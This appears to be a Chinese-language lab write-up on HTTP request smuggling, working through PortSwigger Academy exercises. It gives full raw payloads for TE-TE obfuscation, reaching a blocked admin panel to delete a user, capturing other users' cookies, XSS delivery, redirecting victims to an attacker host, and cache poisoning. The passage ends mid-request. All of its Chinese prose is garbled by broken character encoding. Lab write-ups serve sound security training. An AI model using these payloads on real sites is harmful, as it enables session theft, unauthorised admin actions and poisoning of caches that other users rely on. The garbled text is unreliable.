ä¸¤ä¸ª CRLF æ„é€  chunk dataï¼Œä¹Ÿå°±æ˜¯\n0\\r\\n \\r\\n æ ¹æ®é¢˜ç›®çš„æç¤ºè¦æ±‚ï¼Œè¿™é‡Œæˆ‘ä»¬å‘é€ä¸¤æ¬¡ä»¥ä¸Š HTTP è¯·æ±‚åŒ…å³å¯ï¼Œæˆ‘ä»¬å¯ä»¥æ”¶åˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºçš„å“åº”ã€‚\n \nè¿‡ç¨‹æµç¨‹ä¸ CL-TE ç±»ä¼¼ï¼ŒFront æœåŠ¡å™¨å¤„ç†è¿™ä¸ªè¯·æ±‚çš„æ—¶å€™æŒ‰ç…§ TE ä¼˜å…ˆå¤„ç†ï¼Œä¼šè®¤ä¸ºä¸Šé¢çš„è¯·æ±‚ä¸ºä¸€ä¸ªè¯·æ±‚æ•´ä½“ï¼Œç„¶åè½¬å‘ç»™ Backend æœåŠ¡å™¨ï¼ŒBackend æœåŠ¡å™¨åœ¨å¤„ç†çš„æ—¶å€™æŒ‰ç…§ CL ä¼˜å…ˆå¤„ç†ï¼Œä¼šè®¤ä¸º12\\r\\nä¸ºç¬¬ä¸€ä¸ªè¯·æ±‚çš„ body ï¼Œä»¥ä¸‹ä¸ºç¬¬äºŒä¸ªè¯·æ±‚ï¼Œæ‰€ä»¥ä¼šå“åº” GPOST ä¸ºæ— æ³•è¯†åˆ«çš„ HTTP Methodã€‚\nTwo Identical Fields - TE è¿™é‡Œæˆ‘ä»¬æ¥çœ‹ TE éƒ½å­˜åœ¨çš„æƒ…å†µï¼ŒåŒæ ·æˆ‘ä»¬å€ŸåŠ© LAB å®éªŒæ¥åŠ æ·±ç†è§£ï¼šLab: HTTP request smuggling, obfuscating the TE header\n This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\n æŒ‰ç…§é¢˜ç›®æç¤ºï¼Œæˆ‘ä»¬è¦è¾¾åˆ°çš„ä»ç„¶æ˜¯è®©åç«¯æ”¶åˆ° GPOST è¯·æ±‚ï¼Œè€Œä¸”åœºæ™¯ä¹Ÿæ˜ç¡®å‘Šè¯‰æˆ‘ä»¬æ˜¯ä¸€ç§ TE-TE çš„åœºæ™¯ã€‚å…¶å®è¿™ä¸ªåœºæ™¯ä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯ç›¸åŒå­—æ®µçš„åœºæ™¯å¤„ç†ï¼Œæ¯”å¦‚è¯´åœ¨å¤„ç†ä¸¤ä¸ª TE å­—æ®µï¼Œå¦‚æœå–ç¬¬äºŒä¸ª TE å­—æ®µä½œä¸ºè§£ææ ‡å‡†ï¼Œè€Œç¬¬äºŒä¸ªå­—æ®µå€¼éæ­£å¸¸æˆ–è€…è§£æå‡ºé”™ï¼Œå°±å¯èƒ½ä¼šå¿½ç•¥æ‰ TE å­—æ®µï¼Œè€Œä½¿ç”¨ CL å­—æ®µè¿›è¡Œè§£æã€‚æ¯”å¦‚åœ¨è¿™ä¸ª LAB ä¸­ï¼Œæˆ‘ä»¬å‘é€ä¸¤éå¦‚ä¸‹è¯·æ±‚ï¼š\nPOST / HTTP/1.1 Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ Cache-Control: max-age=0 Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: nothing 12 GPOST / HTTP/1.1 0 è¿™é‡ŒåŒä¸Šä¸€ä¸ªåœºæ™¯ä¸€æ ·ï¼Œéœ€è¦åœ¨æœ€åæ·»åŠ ä¸¤ä¸ª CRLF ï¼š\n0\\r\\n \\r\\n æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›¾çš„å“åº”ï¼š\n \næˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ç”¨äº†ä¸¤ä¸ª TE å­—æ®µï¼Œå¹¶ä¸”ç¬¬äºŒä¸ª TE å­—æ®µå€¼éæ ‡å‡†å€¼ï¼Œè¿™é‡Œ Front é€‰æ‹©å¯¹ç¬¬ä¸€ä¸ª TE è¿›è¡Œä¼˜å…ˆå¤„ç†ï¼Œæ•´ä¸ªè¯·æ±‚åˆ™ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œä¼šè½¬å‘ç»™ Backend æœåŠ¡å™¨ï¼Œè€Œ Backend æœåŠ¡å™¨ä»¥ç¬¬äºŒä¸ª TE è¿›è¡Œä¼˜å…ˆå¤„ç†ï¼Œè€Œç¬¬äºŒä¸ª TE å€¼éæ­£å¸¸ï¼Œåˆ™ä¼šå– CL å­—æ®µè¿›è¡Œå¤„ç†ï¼Œè¿™æ ·è¿™ä¸ªè¯·æ±‚å°±ä¼šå› ä¸º CL å­—æ®µè®¾ç½®çš„å€¼ 4 è€Œè¢«æ‹†åˆ†ä¸ºä¸¤ä¸ªè¯·æ±‚ã€‚\nç¬¬ä¸€ä¸ªè¯·æ±‚ï¼š\nPOST / HTTP/1.1 Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ Cache-Control: max-age=0 Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: nothing 12 ç¬¬äºŒä¸ªè¯·æ±‚ï¼š\nGPOST / HTTP/1.1 0 è¿™æ ·å°±å‘é€äº†ä¸€ä¸ªæ— æ³•è¯†åˆ«çš„ HTTP Method GPOST è¯·æ±‚ã€‚\nAttack Surface ä¸Šé¢æˆ‘ä»¬å¤§æ¦‚ä»‹ç»äº†å‡ ç§æ”»å‡»æ–¹å¼ï¼Œä¸‹é¢æˆ‘æ¥çœ‹çœ‹è¿™äº›æ”»å‡»æ–¹å¼å¯ä»¥ç”¨æ¥å¹²å˜›ã€‚åŒæ ·æˆ‘ä»¬å°†é…åˆå®éªŒç¯å¢ƒå¸®åŠ©ç†è§£ä¸å¤ç°ã€‚\nBypass Front-end Security Controls è¿™é‡Œæä¾›äº†ä¸¤ä¸ªå®éªŒç¯å¢ƒï¼Œä¸€ä¸ªæ˜¯ CL-TE å½¢å¼çš„ Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ï¼Œä¸€ä¸ªæ˜¯TE-CL å½¢å¼çš„ Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerabilityï¼Œä¸¤ä¸ªå®éªŒæœ€ç»ˆè¾¾åˆ°çš„ç›®çš„ä¸€æ ·ï¼Œè¿™é‡Œæˆ‘ä»¬éšä¾¿é€‰ç”¨ CL-TE çš„æ¥è¿›è¡Œå®éªŒã€‚\n â€‹\tThis lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding. There\u0026rsquo;s an admin panel at /admin, but the front-end server blocks access to it.\nTo solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.\n æ¶æ„ä¸€æ ·ï¼Œåªä¸è¿‡è¿™æ¬¡æˆ‘ä»¬éœ€è¦å»åˆ©ç”¨ HTTP Smuggling è·å– admin æƒé™å¹¶åˆ é™¤ carlos ç”¨æˆ·ã€‚\næˆ‘ä»¬ç”Ÿæˆ LAB ä¹‹åï¼Œç›´æ¥è®¿é—®/adminä¼šå‘ç° \u0026quot;Path /admin is blocked\u0026quot;ï¼Œçœ‹æ¥ä¸èƒ½é€šè¿‡æ­£å¸¸æ–¹å¼è®¿é—®/adminï¼Œé‚£æˆ‘ä»¬å°è¯• HTTP Smuggling çš„æ–¹å¼ï¼Œå‘é€å¦‚ä¸‹æ•°æ®åŒ…ä¸¤æ¬¡ï¼š\nPOST / HTTP/1.1 Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 28 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 å¾—åˆ°çš„å“åº”å¦‚ä¸‹ä¸¤å›¾\n \n \nå¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªè¯·æ±‚æˆ‘ä»¬å¾—åˆ°äº†/adminçš„å“åº”\n\u0026lt;div class=\u0026#34;container is-page\u0026#34;\u0026gt; Admin interface only available if logged in as an administrator, or if requested as localhost \u0026lt;/div\u0026gt; äºæ˜¯æˆ‘ä»¬æ·»åŠ  HOST å¤´å†æ¬¡å‘é€å‡ æ¬¡\nPOST / HTTP/1.1 Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 45 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆåŠŸè®¿é—®åˆ°äº†/adminé¢æ¿å†…å®¹ï¼Œå¦‚æœä¸æˆåŠŸå¯ä»¥å¤šå‘é€å‡ æ¬¡è¯•è¯•çœ‹\n \nå¾—åˆ°äº†åˆ é™¤çš„ api ï¼Œäºæ˜¯æˆ‘ä»¬å†åˆ©ç”¨ HTTP Smuggling è®¿é—®è¿™ä¸ª /admin/delete?username=carlos å³å¯ï¼Œæ„é€ å¦‚ä¸‹æ•°æ®åŒ…ï¼š\nPOST / HTTP/1.1 Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 63 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost  \nè¿™ç§æ”»å‡»æ–¹å¼ç±»ä¼¼ HTTP SSRF ï¼Œä¸»è¦çš„ç‚¹å°±æ˜¯åœ¨æ§åˆ¶ CL æ•°å€¼ä¸Šï¼Œæ¯”å¦‚è¯´ç¬¬ä¸€ä¸ªæ•°æ®åŒ… CL çš„å€¼ä¸º 28 ï¼Œæ˜¯è¿™ä¹ˆè®¡ç®—çš„ï¼š\n0\\r\\n\t--\u0026gt; 3ä¸ªå­—èŠ‚ \\r\\n\t--\u0026gt; 2ä¸ªå­—èŠ‚ GET /admin HTTP/1.1\\r\\n\t--\u0026gt; 19+2 = 21 ä¸ªå­—èŠ‚ \\r\\n\t--\u0026gt; 2ä¸ªå­—èŠ‚ æ‰€ä»¥è¿™ä¹ˆç»“ç®—ä¸‹æ¥å°±æ˜¯ 3+2+21+2 = 28å­—èŠ‚ã€‚\nTE-CL çš„æƒ…å†µç±»ä¼¼ï¼Œè¿™é‡Œå°±ä¸å†é‡å¤ä¸¾ä¾‹äº†ã€‚\nRevealing Front-end Request Rewriting  â€‹\tåœ¨æœ‰çš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚åï¼Œä¸ä¼šç›´æ¥è½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œè€Œæ˜¯å…ˆæ·»åŠ ä¸€äº›å¿…è¦çš„å­—æ®µï¼Œç„¶åå†è½¬å‘ç»™åç«¯æœåŠ¡å™¨ã€‚è¿™äº›å­—æ®µæ˜¯åç«¯æœåŠ¡å™¨å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†æ‰€å¿…é¡»çš„ï¼Œæ¯”å¦‚ï¼š\n æè¿°TLSè¿æ¥æ‰€ä½¿ç”¨çš„åè®®å’Œå¯†ç  åŒ…å«ç”¨æˆ·IPåœ°å€çš„XFFå¤´ ç”¨æˆ·çš„ä¼šè¯ä»¤ç‰ŒID  æ€»ä¹‹ï¼Œå¦‚æœä¸èƒ½è·å–åˆ°ä»£ç†æœåŠ¡å™¨æ·»åŠ æˆ–è€…é‡å†™çš„å­—æ®µï¼Œæˆ‘ä»¬èµ°ç§è¿‡å»çš„è¯·æ±‚å°±ä¸èƒ½è¢«åç«¯æœåŠ¡å™¨è¿›è¡Œæ­£ç¡®çš„å¤„ç†ã€‚é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•è·å–è¿™äº›å€¼å‘¢ã€‚PortSwiggeræä¾›äº†ä¸€ä¸ªå¾ˆç®€å•çš„æ–¹æ³•ï¼Œä¸»è¦æ˜¯ä¸‰å¤§æ­¥éª¤ï¼š\n æ‰¾ä¸€ä¸ªèƒ½å¤Ÿå°†è¯·æ±‚å‚æ•°çš„å€¼è¾“å‡ºåˆ°å“åº”ä¸­çš„POSTè¯·æ±‚ æŠŠè¯¥POSTè¯·æ±‚ä¸­ï¼Œæ‰¾åˆ°çš„è¿™ä¸ªç‰¹æ®Šçš„å‚æ•°æ”¾åœ¨æ¶ˆæ¯çš„æœ€åé¢ ç„¶åèµ°ç§è¿™ä¸€ä¸ªè¯·æ±‚ï¼Œç„¶åç›´æ¥å‘é€ä¸€ä¸ªæ™®é€šçš„è¯·æ±‚ï¼Œå‰ç«¯æœåŠ¡å™¨å¯¹è¿™ä¸ªè¯·æ±‚é‡å†™çš„ä¸€äº›å­—æ®µå°±ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚   æœ‰æ—¶å€™ Front æœåŠ¡å™¨ä¼šç»™è½¬å‘çš„è¯·æ±‚æ·»åŠ ä¸€äº›è¯·æ±‚å¤´å†è½¬å‘ç»™ Backend æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ HTTP Smuggling çš„æ–¹å¼æ¥æ³„éœ²è¿™äº›è¯·æ±‚å¤´ã€‚åŒæ ·æˆ‘ä»¬å€ŸåŠ© LAB æ¥å®è·µç†è§£ï¼šLab: Exploiting HTTP request smuggling to reveal front-end request rewriting\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding.\nThere\u0026rsquo;s an admin panel at /admin, but it\u0026rsquo;s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It\u0026rsquo;s similar to the X-Forwarded-For header but has a different name.\nTo solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.\n è¿™é‡Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œåœºæ™¯æ˜¯ä¸€ä¸ª CL-TE çš„åœºæ™¯ï¼Œå¹¶ä¸”ç»™å‡ºä¸€ä¸ªæœç´¢æ¡†ï¼Œæˆ‘ä»¬å°è¯•éšä¾¿æœç´¢ä¸€ä¸ª 123 ï¼Œå¯ä»¥å‘ç°æœç´¢ç»“æœâ€œ123â€ç›´æ¥å›æ˜¾åˆ°äº†ç›¸åº”å½“ä¸­ã€‚\n \nå°è¯•ä½¿ç”¨ HTTP Smuggling æ–¹å¼è®¿é—®ï¼Œä½†æ˜¯è¢« blocked ï¼š\n \nç„¶åæˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨æœç´¢å›æ˜¾æŠŠ Front æœåŠ¡å™¨è½¬å‘çš„è¯·æ±‚å¤´ç»™æ³„éœ²å‡ºæ¥ï¼š\n \nå¦‚æœåé¢åªæ˜¯æ·»åŠ é‚£ä¸ª X-*-Ip çš„è¯·æ±‚å¤´æ˜¯è®¿é—®ä¸äº† admin é¢æ¿çš„ï¼Œå› ä¸ºè¿™æ ·ä¼šè®© Backend æ”¶åˆ°ä¸¤ä¸ªé‡å¤çš„è¯·æ±‚å¤´ï¼Œåœ¨è¿™ä¸ªåœºæ™¯å½“ä¸­ï¼ŒBackend æœåŠ¡å™¨å¯¹é‡å¤çš„è¯·æ±‚å¤´åšå‡ºäº†åˆ¤æ–­ï¼š\n \næ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠ Front æœåŠ¡å™¨æ·»åŠ çš„è¯·æ±‚å¤´ç»™â€œéšè—â€æ‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ Smuggling é€šè¿‡ body çš„æ–¹å¼æŠŠå…¶ä»– Front æœåŠ¡å™¨æ·»åŠ çš„è¯·æ±‚å¤´â€œéšè—â€æ‰ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ° admin é¢æ¿å›æ˜¾ï¼š\n \næ•´ä¸ªæµç¨‹çœ‹èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯ä»”ç»†åšçš„è¯ï¼Œå…¶å® CL çš„å€¼æ¯”è¾ƒå…³é”®ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æ³„éœ² Front è¯·æ±‚çš„é‚£ä¸ªæ•°æ®åŒ…çš„ CL å€¼æ€ä¹ˆç®—çš„ï¼š\n0\\r\\n\t--\u0026gt;\t3ä¸ªå­—èŠ‚ \\r\\n\t--\u0026gt; 2ä¸ªå­—èŠ‚ POST / HTTP/1.1\\r\\n\t--\u0026gt;\t17ä¸ªå­—èŠ‚ Content-Length: 70\\r\\n\t--\u0026gt;\t20ä¸ªå­—èŠ‚ Content-Type: application/x-www-form-urlencoded\\r\\n\t--\u0026gt;\t49ä¸ªå­—èŠ‚ \\r\\n\t--\u0026gt; 2ä¸ªå­—èŠ‚ search=123\t--\u0026gt; 10ä¸ªå­—èŠ‚ æ€»å…±æ˜¯ 103 ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œçš„ CL ä¹Ÿå¯ä»¥ä¸æ˜¯ 70 ï¼Œè¿™é‡Œåªæ˜¯æ§åˆ¶æ³„éœ²å¤šå°‘å­—èŠ‚çš„å†…å®¹ã€‚\nè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒéœ€è¦æ³¨æ„çš„å°±æ˜¯å¦‚æœä½ ä¸æ·»åŠ  Content-Type å­—æ®µçš„è¯ï¼Œéœ€è¦åœ¨æœ€åæ·»åŠ ä¸€ä¸ª\\r\\nï¼Œå¦åˆ™ä¼šè¿”å› 400 ã€‚\nCapturing other users' requests æ—¢ç„¶èƒ½æ‹¿åˆ°ä¸­é—´ä»¶è¯·æ±‚ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•å»æ‹¿å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ï¼Œä¹Ÿèƒ½æ‹¿åˆ° Cookie ç­‰ï¼ŒLAB åœ°å€ï¼šLab: Exploiting HTTP request smuggling to capture other users' requests\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding.\nTo solve the lab, smuggle a request to the back-end server that causes the next user\u0026rsquo;s request to be stored in the application. Then retrieve the next user\u0026rsquo;s request and use the victim user\u0026rsquo;s cookies to access their account.\n åŸç†ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå‘è¯„è®ºçš„åœ°æ–¹ï¼Œç„¶ååˆ©ç”¨è¯„è®ºå¤„è¿›è¡Œ HTTP Smugglingï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä»¥ä¸‹è¯·æ±‚åŒ…ï¼š\nPOST / HTTP/1.1 Host: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 271 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 600 Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN\u0026amp;postId=5\u0026amp;name=1\u0026amp;email=1%40qq.com\u0026amp;website=http%3A%2F%2Fwww.baidu.com\u0026amp;comment=1 åªè¦ä¸‹é¢è¿™ä¸ª CL è¶³å¤Ÿå¤§ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ HTTP Smuggling æŠŠä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚æ‹¼æ¥åˆ°æˆ‘ä»¬æœ€åä¸€ä¸ª comment å‚æ•°é‡Œé¢äº†ï¼Œç„¶åæˆ‘ä»¬åœ¨çœ‹è¯„è®ºå¤„å°±å¯ä»¥çœ‹åˆ°åˆ«äººçš„è¯·æ±‚å¤´äº†ã€‚\n \nExploit Reflected XSS è¿™ä¸ªåˆ©ç”¨åœºæ™¯å¯èƒ½æ¯”è¾ƒå—é™ï¼Œä¹Ÿæ¯”è¾ƒå°‘è§ï¼Œä½†æ˜¯å¦‚æœå­˜åœ¨ HTTP Smuggling \u0026amp; reflected XSS ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç»„åˆæ‹³ X åˆ°åˆ«äººçš„ cookie\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding.\nThe application is also vulnerable to reflected XSS via the User-Agent header.\nTo solve the lab, smuggle a request to the back-end server that causes the next user\u0026rsquo;s request to receive a response containing an XSS exploit that executes alert(1).\n è¿˜æ˜¯ä¾æ—§çš„ CL-TE åœºæ™¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ UA å¤„å‘ç°æœ‰ä¸€ä¸ªåå°„ XSSï¼Œbut å•æ˜¯è¿™æ ·æ²¡ä»€ä¹ˆç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æƒ³ç‚¹åŠæ³•å‡çº§å±å®³ã€‚\n \næˆ‘ä»¬å¯ä»¥æ„é€ ä»¥ä¸‹æ•°æ®åŒ…ï¼Œåªè¦å‘é€ä¸€æ¬¡\nPOST / HTTP/1.1 Host: ac811f011e27d43b80301693005a0007.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ Upgrade-Insecure-Requests: 1 Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 ç„¶åæˆ‘ä»¬éšä¾¿è®¿é—®è¯¥ç«™ä»»ä½•é¡µé¢éƒ½ä¼šè¢«å¼¹çª—äº†ï¼Œå› ä¸ºæˆ‘ä»¬çš„è¯·æ±‚è¢«åµŒå…¥åˆ°äº†ä¸Šé¢çš„ç¬¬äºŒä¸ªè¯·æ±‚å½“ä¸­ï¼š\n \n \nTurn An On-Site Redirect Into An Open Redirect è¿™ç§æ”»å‡»åœºæ™¯æ˜¯åœ¨ç›®æ ‡åœ¨ä½¿ç”¨ 30x è·³è½¬çš„æ—¶å€™ï¼Œä½¿ç”¨äº† Host å¤´è¿›è¡Œè·³è½¬ï¼Œä¾‹å¦‚åœ¨ Apache \u0026amp; IIS æœåŠ¡å™¨ä¸Šï¼Œä¸€ä¸ªuri æœ€åä¸å¸¦ / çš„è¯·æ±‚ä¼šè¢« 30x å¯¼å‘å¸¦ / çš„åœ°å€ï¼Œä¾‹å¦‚å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š\nGET /home HTTP/1.1 Host: normal-website.com æˆ‘ä»¬ä¼šå¾—åˆ° Response :\nHTTP/1.1 301 Moved Permanently Location: https://normal-website.com/home/ çœ‹èµ·æ¥æ²¡ä»€ä¹ˆå±å®³ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬é…åˆ HTTP Smuggling å°±ä¼šæœ‰é—®é¢˜äº†ï¼Œä¾‹å¦‚ï¼š\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 54 Transfer-Encoding: chunked 0 GET /home HTTP/1.1 Host: attacker-website.com Foo: X Smugle ä¹‹åçš„è¯·æ±‚ä¼šåƒä»¥ä¸‹è¿™æ ·ï¼š\nGET /home HTTP/1.1 Host: attacker-website.com Foo: XGET /scripts/include.js HTTP/1.1 Host: vulnerable-website.com ç„¶åå¦‚æœæœåŠ¡å™¨æ ¹æ® Host è¿›è¡Œè·³è½¬çš„è¯ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä»¥ä¸‹çš„ Response:\nHTTP/1.1 301 Moved Permanently Location: https://attacker-website.com/home/ è¿™æ ·ï¼Œå—å®³è€…ï¼Œä¹Ÿå°±æ˜¯è®¿é—®/scripts/include.jsè¿™ä¸ªçš„ç”¨æˆ·ï¼Œä¼šè¢«è·³è½¬åˆ°æˆ‘ä»¬æ§åˆ¶çš„ url äº†ã€‚\nPerform Web Cache Poisoning è¿™ä¸ªåœºæ™¯ä¹Ÿæ˜¯åŸºäºä¸Šé¢çš„ Host è·³è½¬çš„æ”»å‡»åœºæ™¯ï¼Œå¦‚æœ Front æœåŠ¡å™¨è¿˜å­˜åœ¨ç¼“å­˜é™æ€èµ„æºçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥é…åˆ HTTP Smuggling è¿›è¡Œç¼“å­˜æŠ•æ¯’ï¼ŒLab: Exploiting HTTP request smuggling to perform web cache poisoning\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding. The front-end server is configured to cache certain responses.\nTo solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.\n è¿™ä¸ªç¯å¢ƒä¹Ÿæ˜¯ä¸€ä¸ªå¯ä»¥ä¿®æ”¹ Host è¿›è¡Œè·³è½¬çš„åœºæ™¯ï¼Œè€Œåœ¨/post/next?postId=2è·¯ç”±æ­£å¥½æœ‰ä¸€ä¸ªè·³è½¬çš„ api ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Œè¿™ä¸ªè·¯ç”±è·³è½¬åˆ°çš„æ˜¯/post?postId=4ã€‚\næ ¹æ®é¢˜ç›®æè¿°ï¼Œæˆ‘ä»¬éœ€è¦å®ç°ç¼“å­˜æŠ•æ¯’ï¼Œ ä¾‹å¦‚è¿™é‡Œæˆ‘ä»¬å°±é€‰æ‹©/resources/js/tracking.jsè¿›è¡ŒæŠ•æ¯’ï¼ŒLAB è¿˜ç»™äº†æˆ‘ä»¬åˆ¶é€ æŠ•æ¯’çš„æœåŠ¡ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œä»¥ä¸‹è®¾ç½®ï¼š\n \nå‘é€ä»¥ä¸‹æ•°æ®åŒ…ä¸€æ¬¡ï¼š\nPOST / HTTP/1.1 Host: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=f6c7ZBB52a6iedorGSywc8jM6USu4685 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 178 Transfer-Encoding: chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.net Content-Type: 